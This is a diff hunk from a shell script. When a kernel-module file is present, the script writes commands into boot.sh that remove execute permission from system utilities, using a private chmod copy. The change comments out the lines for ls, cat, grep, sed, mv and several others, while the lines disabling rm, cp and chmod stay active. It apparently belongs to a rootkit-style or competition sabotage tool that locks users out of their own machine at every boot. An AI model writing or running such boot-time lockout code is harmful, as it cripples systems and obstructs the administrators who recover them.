@@ -38,17 +38,17 @@ if test -f "$koFile"; then
         echo "$trovePath/chmod -x /usr/bin/rm" >> boot.sh
         echo "$trovePath/chmod -x /usr/bin/cp" >> boot.sh
         echo "$trovePath/chmod -x /usr/bin/chmod" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/mkdir" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/nano" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/touch" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/mv" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/rmdir" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/grep" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/egrep" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/sed" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/cat" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/lsattr" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/ls" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/mkdir" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/nano" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/touch" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/mv" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/rmdir" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/grep" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/egrep" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/sed" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/cat" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/lsattr" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/ls" >> boot.sh
         #echo "$trovePath/chmod -x /usr/bin/mount" >> boot.sh
         #echo "$trovePath/chmod -x /usr/bin/dd" >> boot.sh
         #echo "$trovePath/chmod -x /usr/bin/fdisk" >> boot.sh
